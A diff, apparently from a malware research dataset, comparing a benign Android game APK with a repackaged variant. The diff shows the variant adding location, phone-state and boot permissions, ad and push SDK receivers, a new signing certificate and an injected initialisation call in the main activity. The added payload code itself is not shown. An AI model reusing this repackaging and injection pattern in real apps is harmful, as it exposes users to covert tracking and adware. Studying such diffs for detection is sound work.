@@ -1,0 +1,526 @@
+diff -r result/APP_21/App_B_21/AndroidManifest.xml result/APP_21/App_M_21/AndroidManifest.xml
+3a4,14
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+24a36,78
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.push.MainActivity"/>
+>         <service android:name="com.kuguo.push.MainService"/>
+>         <receiver android:name="com.kuguo.push.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.crazymedia.iad.AdPushActivity"/>
+>         <receiver android:name="net.crazymedia.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.crazymedia.iad.AdPushService"/>
+>         <service android:name="com.gameseea.Wifiservices"/>
+>         <service android:name="com.gameseea.Seservice"/>
+>         <activity android:name="com.gameseea.SeeaActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Dialog"/>
+>         <receiver android:name="com.gameseea.BroadReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <meta-data android:name="ZY_APP_ID" android:value="57269387bf8a4e268d38ffadf3e55ea5"/>
+>         <meta-data android:name="ZY_LOCK_ID" android:value="1"/>
+>         <meta-data android:name="INIT_KEY" android:value="753e5e890d6c423c929345a0dcc9a322,9818,6ntnf8fv0rdxkftk,20121122,1"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="4ff5ae0a5270155bf800001a"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+>         <meta-data android:name="tapjoy.store_name" android:value="gfan"/>
+diff -r result/APP_21/App_B_21/apktool.yml result/APP_21/App_M_21/apktool.yml
+2c2
+< apkFileName: Bapp21-26D97DA55404AE77C352322EFDBAE62F9796F99A335C048D71022B9F0FF755BB.apk
+---
+> apkFileName: Mapp21-CEBBBDAAC71F31619BFAF9BE9F0F13FFBED47285EC2D0F336354F9CEFDED1983.apk
+5d4
+< - resources.arsc
+8a8
+> - jpg
+11d10
+< - jpg
+Somente em result/APP_21/App_M_21/assets: kuguo_res
+Somente em result/APP_21/App_M_21/assets: seads
+Somente em result/APP_21/App_M_21/com: gameseea
+Somente em result/APP_21/App_M_21/com: geseng
+Somente em result/APP_21/App_M_21/com: kuguo
+Somente em result/APP_21/App_M_21/com: tapjoy
+Somente em result/APP_21/App_M_21/com: umeng
+Somente em result/APP_21/App_M_21/: net
+Os arquivos binários result/APP_21/App_B_21/original/AndroidManifest.xml e result/APP_21/App_M_21/original/AndroidManifest.xml são diferentes
+Somente em result/APP_21/App_B_21/original/META-INF: CERT.RSA
+Somente em result/APP_21/App_B_21/original/META-INF: CERT.SF
+diff -r result/APP_21/App_B_21/original/META-INF/MANIFEST.MF result/APP_21/App_M_21/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+24a25,27
+> Name: res/layout/of_simple_notification.xml
+> SHA1-Digest: 6KCa3FXkjtA2SERL4FntGPjpNMs=
+> 
+28,30d30
+< Name: res/layout/of_simple_notification.xml
+< SHA1-Digest: vVKroh/B9ddguSUPd5SSbPeZ2Ac=
+< 
+44c44
+< SHA1-Digest: 8jX87OfaD25xVh5UJ/Bo6nhyWi0=
+---
+> SHA1-Digest: EVbWpjknFLb6rZwoHmLxOYjrA3c=
+60a61,63
+> Name: assets/seads/deldown.png
+> SHA1-Digest: ZgaV/KvuLkUh57ahYio5kW09MCo=
+> 
+68c71
+< SHA1-Digest: z8CscCBwFRJy49SV/gK7qUST2Dw=
+---
+> SHA1-Digest: qVoGbC5UY9W+s2DnigS/GYQS4qw=
+81a85,87
+> Name: assets/webui/stylesheets/game_channel.orig.css
+> SHA1-Digest: f060ew1GSeMJUGNF8OOxkQCH9Rk=
+> 
+88,89c94,95
+< Name: assets/webui/stylesheets/game_channel.orig.css
+< SHA1-Digest: f060ew1GSeMJUGNF8OOxkQCH9Rk=
+---
+> Name: assets/webui/javascripts/webui-touch.js
+> SHA1-Digest: gP9Ddpq8qOpxfpl0j8JYIosxCRQ=
+94,96d99
+< Name: assets/webui/javascripts/webui-touch.js
+< SHA1-Digest: gP9Ddpq8qOpxfpl0j8JYIosxCRQ=
+< 
+103,105d105
+< Name: assets/webui/images/logo.mdpi.png
+< SHA1-Digest: FGsiADIU4mLZYBjBpqKvnr+GGXs=
+< 
+108a109,111
+> Name: assets/webui/images/logo.mdpi.png
+> SHA1-Digest: FGsiADIU4mLZYBjBpqKvnr+GGXs=
+> 
+117a121,123
+> Name: assets/seads/KKright.png
+> SHA1-Digest: T2xTh3PAV0jZcgCyUXa384e3T2w=
+> 
+121,123d126
+< Name: assets/webui/images/carrot.png
+< SHA1-Digest: GbdElbME49XVzIThwDPMFlQz3UE=
+< 
+126a130,132
+> Name: assets/webui/images/carrot.png
+> SHA1-Digest: GbdElbME49XVzIThwDPMFlQz3UE=
+> 
+130,132d135
+< Name: assets/webui/images/circles.hdpi.png
+< SHA1-Digest: WaKpEfDlSiTSpv3m+AiBjXQENeY=
+< 
+135a139,141
+> Name: assets/webui/images/circles.hdpi.png
+> SHA1-Digest: WaKpEfDlSiTSpv3m+AiBjXQENeY=
+> 
+149c155
+< SHA1-Digest: MnuEdLuXlyLWQBhh1bXlgHoLwWI=
+---
+> SHA1-Digest: JfM7YN+A1HgqsHJU9ciNsbW6u3k=
+163,165d168
+< Name: assets/webui/images/bottom_body.png
+< SHA1-Digest: jRC3g3fH9xSUSV+zmrkdAz3SXUE=
+< 
+168a172,174
+> Name: assets/webui/images/bottom_body.png
+> SHA1-Digest: jRC3g3fH9xSUSV+zmrkdAz3SXUE=
+> 
+194c200
+< SHA1-Digest: 6YYL5v87enDANHTc4fTiBKyQf8Q=
+---
+> SHA1-Digest: NE64WMYkhI1YTSfjRqyOS0/OAZo=
+213a220,222
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+229,231d237
+< Name: assets/webui/images/icon_facebook_sm.mdpi.png
+< SHA1-Digest: Ms89zkLQT9SXykft2usvTBx9j9o=
+< 
+234a241,243
+> Name: assets/webui/images/icon_facebook_sm.mdpi.png
+> SHA1-Digest: Ms89zkLQT9SXykft2usvTBx9j9o=
+> 
+236c245
+< SHA1-Digest: LV598oQ4IHOwx6tG7TgUF/4gDRQ=
+---
+> SHA1-Digest: ZPngmj8YAtJqBeSEv+fHrIfAcVs=
+248,251c257
+< SHA1-Digest: d7gIpK/RPlMdEG2/4FCUDOwkcSg=
+< 
+< Name: assets/webui/images/icon.game.mdpi.png
+< SHA1-Digest: FoTFnTWGArPq6+LXMu6cKWlzl+I=
+---
+> SHA1-Digest: oaUlqeUGqWaTP2GdJJ8eQNcr7S8=
+255a262,264
+> Name: assets/webui/images/icon.game.mdpi.png
+> SHA1-Digest: FoTFnTWGArPq6+LXMu6cKWlzl+I=
+> 
+267a277,279
+> Name: assets/seads/downfullbtndown.png
+> SHA1-Digest: G6BqgQPnAuUqU/aLQePLKANbrWw=
+> 
+269c281
+< SHA1-Digest: xuoIQXjfHZqKgmm1BfcxYkgbKjQ=
+---
+> SHA1-Digest: q4L+Ah6j3w5ZUckEdQSb5IzeBdk=
+282a295,297
+> Name: assets/seads/small6.png
+> SHA1-Digest: sgQ4MENjmqUpBfq2XcTTc09pEek=
+> 
+297a313,315
+> Name: assets/seads/smallup.png
+> SHA1-Digest: LH6d38xDMcAbmil2N6TUtAm5y2g=
+> 
+302c320
+< SHA1-Digest: 9h0vwhnhRG1hPyXDnoQHFJqE8GE=
+---
+> SHA1-Digest: 8BrlwvoJ+i3FOASIpd4g1UQp+Pc=
+335c353
+< SHA1-Digest: +fTUI266fUW80gJ4P9BYc1LWhgk=
+---
+> SHA1-Digest: fhnVZxyiMg5BooKXd0R987ZnwG4=
+369a388,390
+> Name: assets/seads/small7.png
+> SHA1-Digest: 9gZs5DAXdi4azzi8VVf5dBC0ycc=
+> 
+381a403,408
+> Name: assets/seads/KKshow.png
+> SHA1-Digest: XfqICeJQH11usMYb9UmgDNBF/gc=
+> 
+> Name: assets/seads/small2.png
+> SHA1-Digest: eiXpQE06G+NUOI9aI7RNMF9BYn0=
+> 
+383c410
+< SHA1-Digest: 8V4/TM8LxPX32MgLWLny1kFaIoE=
+---
+> SHA1-Digest: JCozQvQADyj71Z9QJllaxWmoRSs=
+386c413
+< SHA1-Digest: n+1MQ0He4TfvlrQ60PBT4NriJZg=
+---
+> SHA1-Digest: Y2PMuLHlJW6jZUk26i2cI72PzCY=
+402a430,435
+> Name: assets/seads/smalldown.png
+> SHA1-Digest: VAPGTZRuBsgqT7mnXs4SVEkk/Ks=
+> 
+> Name: assets/seads/downbtnup.png
+> SHA1-Digest: xsdu5M1rZLM32OHwp7e9M04RnQo=
+> 
+406,408d438
+< Name: assets/webui/images/tab.divider.hdpi.png
+< SHA1-Digest: 8aP41ZH2MUCvksjd24NUvPdQOos=
+< 
+411a442,444
+> Name: assets/webui/images/tab.divider.hdpi.png
+> SHA1-Digest: 8aP41ZH2MUCvksjd24NUvPdQOos=
+> 
+429a463,465
+> Name: assets/seads/delup.png
+> SHA1-Digest: bmeLe/w6ZFk5lQghHwaJ6vRSJ2o=
+> 
+444a481,483
+> Name: assets/seads/small10.png
+> SHA1-Digest: T3Q4rKo8Q1lS/mzeluV0wJAM8LU=
+> 
+457,458c496,497
+< Name: res/drawable-hdpi/icon.png
+< SHA1-Digest: 7mfrhUUNlxyjQh+ac1YwS06MSvY=
+---
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+464c503,506
+< SHA1-Digest: O27Wk1P9rw1n+gZgHMw3xDmLx28=
+---
+> SHA1-Digest: 1zDqIiqPH7CGfUmQarOKT9w5s14=
+> 
+> Name: res/drawable-hdpi/icon.png
+> SHA1-Digest: 7mfrhUUNlxyjQh+ac1YwS06MSvY=
+507a550,552
+> Name: assets/seads/small8.png
+> SHA1-Digest: +dq0qcqEv9Z6TNIIj0ciHCS/Wg0=
+> 
+512c557
+< SHA1-Digest: kC2RQlbdp7wW548F9Ln2dB2FhGQ=
+---
+> SHA1-Digest: AT+bT+UZG3fqZrfrtOPIg+w5rgQ=
+516a562,564
+> Name: assets/seads/small9.png
+> SHA1-Digest: O7JTJs5kftIWHmEubly33N+ToME=
+> 
+522a571,573
+> Name: assets/seads/small5.png
+> SHA1-Digest: UPwgdywi8f8Q+ykzWAJmdDQPqGY=
+> 
+527c578
+< SHA1-Digest: +ujNTS06D71blZ8OiRTaYd0ePAA=
+---
+> SHA1-Digest: cJYVapXN3IRh/IQt5d825pCW/NM=
+544,545c595,596
+< Name: assets/webui/settings/email.json
+< SHA1-Digest: pjjRbqqjFY3hnGTuXn8jOognuG0=
+---
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: oY/MZIRapnKGabQhUv9sd8CPCbQ=
+549a601,603
+> Name: assets/webui/settings/email.json
+> SHA1-Digest: pjjRbqqjFY3hnGTuXn8jOognuG0=
+> 
+554c608
+< SHA1-Digest: cjHoICSZjCIJEomP/zkv/zZQ3p8=
+---
+> SHA1-Digest: PKip/O5q00Gol7b87eP9dxT4DZ8=
+602c656
+< SHA1-Digest: 2l2TeqXECJcfNjb4QP4gzEH20Xg=
+---
+> SHA1-Digest: qbMmwrjCGXf4NU5LLOV4k/IeF44=
+608c662
+< SHA1-Digest: 9G3p8WMPOC6Evka6rTtlmmb2MK0=
+---
+> SHA1-Digest: NcPEG3cLdYhErYGZq4IjxgsJDc4=
+612a667,669
+> Name: assets/seads/app.png
+> SHA1-Digest: ggyWuMkdsdzH510FkQgyLV4hPys=
+> 
+620c677
+< SHA1-Digest: M0Z80pIQoY6wVVnLqz6aVCgpd0o=
+---
+> SHA1-Digest: fTettpPZUV46skJqw8IKF3tVANQ=
+637,638c694,695
+< Name: assets/webui/intro/new_account.json
+< SHA1-Digest: xIsi8zngj9zv0T/EQG90gV37W/c=
+---
+> Name: res/drawable/frame_layout_shape.xml
+> SHA1-Digest: yKtsldcZBvqXBaXcn1Rjq1EryIU=
+643,644c700,707
+< Name: res/drawable/frame_layout_shape.xml
+< SHA1-Digest: bRpRpPMxua0iX5M76BACaw4bZDk=
+---
+> Name: assets/webui/intro/new_account.json
+> SHA1-Digest: xIsi8zngj9zv0T/EQG90gV37W/c=
+> 
+> Name: assets/seads/downfullbtnup.png
+> SHA1-Digest: bNLqYGZtb6cBDsMtFAyCeWEbXi4=
+> 
+> Name: assets/seads/small4.png
+> SHA1-Digest: SL92u1VP97oQI1nHTKE8z178pwo=
+648a712,714
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: CbQHVmHL3PxfmzP+MMFrIUI9vT4=
+> 
+651a718,720
+> Name: assets/seads/seebtndown.png
+> SHA1-Digest: 652ShVAkVpiL3Sr8vLeU463Dxpg=
+> 
+660a730,732
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: MBPHHzDxFqdfXsBLtm7DSajWU1w=
+> 
+665c737
+< SHA1-Digest: lg5Rd3B8CKePPcQA08GdgVJ8kQQ=
+---
+> SHA1-Digest: 8atwmEOXukePwEB96Oyop1K9j7w=
+672a745,747
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: xFZxC1NS0KoZjvtGL4hUEAZ1oMM=
+> 
+677c752,755
+< SHA1-Digest: d9RD3s3w0CqlQHcOFx2nx2E2OBQ=
+---
+> SHA1-Digest: ZoC0Pyq/5thKONWUlzKjRN9q/RQ=
+> 
+> Name: assets/seads/seebtnup.png
+> SHA1-Digest: bNteIdgC1q8LshHLwNrJ5ni68HE=
+681a760,762
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+683c764
+< SHA1-Digest: v9Ah7M0Yg3WGqEOx+D7Mpd8h49c=
+---
+> SHA1-Digest: WcICiwJHC46k46yrET+uyGzyP3U=
+687a769,771
+> Name: assets/webui/stylesheets/att_spotlight/phone.css
+> SHA1-Digest: G/FJITwe10xzYfa2sYtxPpe8c/4=
+> 
+694,695c778,785
+< Name: assets/webui/stylesheets/att_spotlight/phone.css
+< SHA1-Digest: G/FJITwe10xzYfa2sYtxPpe8c/4=
+---
+> Name: assets/seads/downbtndown.png
+> SHA1-Digest: WWKrfHB7wAy/4Fzu7ZcUisCNnEY=
+> 
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: AtUClOw6HmlJO+VrNZ7YD/BWibQ=
+> 
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+709,711d798
+< Name: assets/webui/images/icon_check.hdpi.png
+< SHA1-Digest: Xbw8Pi1o6z+bLFTB6ME/sOsFdUk=
+< 
+714a802,804
+> Name: assets/webui/images/icon_check.hdpi.png
+> SHA1-Digest: Xbw8Pi1o6z+bLFTB6ME/sOsFdUk=
+> 
+728,731c818
+< SHA1-Digest: YubvXD1Hcdn0T16ofsj0Z5nIMXA=
+< 
+< Name: assets/webui/images/button.gray_price.mdpi.png
+< SHA1-Digest: L028bCGerjxUazpAXI+3jnHYvjk=
+---
+> SHA1-Digest: AvmYDTx3mqAlvtnfiUpGuYJskiA=
+735a823,825
+> Name: assets/webui/images/button.gray_price.mdpi.png
+> SHA1-Digest: L028bCGerjxUazpAXI+3jnHYvjk=
+> 
+737c827
+< SHA1-Digest: MrN0wdNzPleyF0xTcZ5BPiILPNU=
+---
+> SHA1-Digest: 6hU4+yAT0dkPwjFaQTxoOToqq30=
+741a832,834
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+761,764c854
+< SHA1-Digest: 6vuiXWFqjZgRTVxG1+RGKMW5uzw=
+< 
+< Name: assets/webui/images/icon.search.button.mdpi.png
+< SHA1-Digest: pBugWSpA1AnXm0j0BD+/nPwPD9o=
+---
+> SHA1-Digest: HRPRJHirNj5Rav4FElln/Xjj8bc=
+768a859,861
+> Name: assets/webui/images/icon.search.button.mdpi.png
+> SHA1-Digest: pBugWSpA1AnXm0j0BD+/nPwPD9o=
+> 
+776c869
+< SHA1-Digest: 9Rofjuj+Nz0dY1lQtf6mneTyKM0=
+---
+> SHA1-Digest: R/ks7gYJ5oQmon8jYKJ73AcIo+s=
+786a880,882
+> Name: assets/seads/KKleft.png
+> SHA1-Digest: o62mkhXpLA5sI2Ra8SNY1/XzYEs=
+> 
+790,792d885
+< Name: assets/webui/images/icon.user.male.hdpi.png
+< SHA1-Digest: dS4XJzCujeMelbK2RkBRrDqZ5Ow=
+< 
+795a889,891
+> Name: assets/webui/images/icon.user.male.hdpi.png
+> SHA1-Digest: dS4XJzCujeMelbK2RkBRrDqZ5Ow=
+> 
+799,801d894
+< Name: assets/webui/images/icon.leaf.green.mdpi.png
+< SHA1-Digest: 1ixcO2zH477wurMmsz9eebL0fPc=
+< 
+804a898,900
+> Name: assets/webui/images/icon.leaf.green.mdpi.png
+> SHA1-Digest: 1ixcO2zH477wurMmsz9eebL0fPc=
+> 
+812c908
+< SHA1-Digest: 1gvbezdu+Rd70Q/hN7A/dtWBxBk=
+---
+> SHA1-Digest: hxURXU9TT7Vi1WxItvIw1qj7Vco=
+826,828d921
+< Name: assets/webui/images/circles.mdpi.png
+< SHA1-Digest: Q1ykUoaE8U8113pr1HpsIlEZd5E=
+< 
+831a925,927
+> Name: assets/webui/images/circles.mdpi.png
+> SHA1-Digest: Q1ykUoaE8U8113pr1HpsIlEZd5E=
+> 
+837a934,936
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+843a943,945
+> Name: assets/webui/settings/forgot_password.json
+> SHA1-Digest: hRCPGd46+LcC2VrGFhToGYYi80g=
+> 
+850,852d951
+< Name: assets/webui/settings/forgot_password.json
+< SHA1-Digest: hRCPGd46+LcC2VrGFhToGYYi80g=
+< 
+854c953
+< SHA1-Digest: nfuq8unhavmRrTwvSVVbCi4YVdw=
+---
+> SHA1-Digest: GnvCxu3CMhChy8v0r5AF+SU4YN0=
+887c986
+< SHA1-Digest: JjDZTFubSc/ypNHXsYwC/Pu+i9s=
+---
+> SHA1-Digest: t2YBIqBmCcWRuLYqAhtLll/NDo8=
+897a997,999
+> Name: assets/seads/small1.png
+> SHA1-Digest: vL0z7hFmejF7KVAC/C72R1K1OD0=
+> 
+902c1004
+< SHA1-Digest: OQWpU4/DdCewS+ZolLggDetlBck=
+---
+> SHA1-Digest: QE1oSFAV7Bh+B/dSNxjG0pCH/LM=
+912a1015,1017
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: YuSe5o0DswmLLQmJLeyoTs7alDY=
+> 
+919,921d1023
+< Name: assets/webui/dashboard/achievements.json
+< SHA1-Digest: tF5grZDs8dJZBgGOyThw/sC6KC0=
+< 
+924a1027,1029
+> Name: assets/webui/dashboard/achievements.json
+> SHA1-Digest: tF5grZDs8dJZBgGOyThw/sC6KC0=
+> 
+939a1045,1047
+> Name: assets/seads/small3.png
+> SHA1-Digest: gDNMRN2t0saRCvj6PF5TGyBCXaA=
+> 
+950c1058
+< SHA1-Digest: VF6HpY50iV5WgXbOUqHahJkG3Ks=
+---
+> SHA1-Digest: eFATRHc36jQSPyzmana7whccaYc=
+Somente em result/APP_21/App_M_21/original/META-INF: RANGFEI.RSA
+Somente em result/APP_21/App_M_21/original/META-INF: RANGFEI.SF
+diff -r result/APP_21/App_B_21/ru/qixi/android/smartrabbits/SmartRabbits.java result/APP_21/App_M_21/ru/qixi/android/smartrabbits/SmartRabbits.java
+5a6
+> import com.geseng.Dienghla;
+28a30
+>     Dienghla.init(this);
+Somente em result/APP_21/App_M_21/smali/com: gameseea
+Somente em result/APP_21/App_M_21/smali/com: geseng
+Somente em result/APP_21/App_M_21/smali/com: kuguo
+Somente em result/APP_21/App_M_21/smali/com: tapjoy
+Somente em result/APP_21/App_M_21/smali/com: umeng
+Somente em result/APP_21/App_M_21/smali: net
+diff -r result/APP_21/App_B_21/smali/ru/qixi/android/smartrabbits/SmartRabbits.smali result/APP_21/App_M_21/smali/ru/qixi/android/smartrabbits/SmartRabbits.smali
+54a55,56
+>     invoke-static {p0}, Lcom/geseng/Dienghla;->init(Landroid/content/Context;)V
+> 
